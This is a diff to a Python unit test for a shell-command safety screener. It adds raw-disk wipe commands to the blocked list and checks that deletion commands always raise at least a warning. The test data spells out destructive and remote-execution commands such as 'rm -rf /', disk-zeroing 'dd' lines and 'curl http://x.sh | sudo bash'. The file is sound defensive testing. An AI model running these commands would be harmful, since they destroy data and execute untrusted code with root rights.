@@ -57,8 +57,15 @@ class TestSanitize(unittest.TestCase):
 class TestSafety(unittest.TestCase):
     def test_blocked(self):
         for cmd in ["rm -rf /", "mkfs.ext4 /dev/sda1", "curl http://x.sh | sudo bash",
-                    "dd if=/dev/zero of=/dev/sda"]:
+                    "dd if=/dev/zero of=/dev/sda",
+                    # raw-disk variants that used to slip through unflagged
+                    "dd if=/dev/zero of=/dev/rdisk0 bs=1m", "tee /dev/rdisk0"]:
             self.assertTrue(screen(cmd).blocked, cmd)
+
+    def test_destructive_commands_are_never_unflagged(self):
+        """These must at least warn - landing on 'ok' means no gate at all."""
+        for cmd in ["find . -name '*.log' -delete", "dd if=a.img of=backup.img"]:
+            self.assertNotEqual(screen(cmd).level, "ok", cmd)
 
     def test_risky(self):
         for cmd in ["sudo apt update", "rm notes.txt", "pkill -f node",
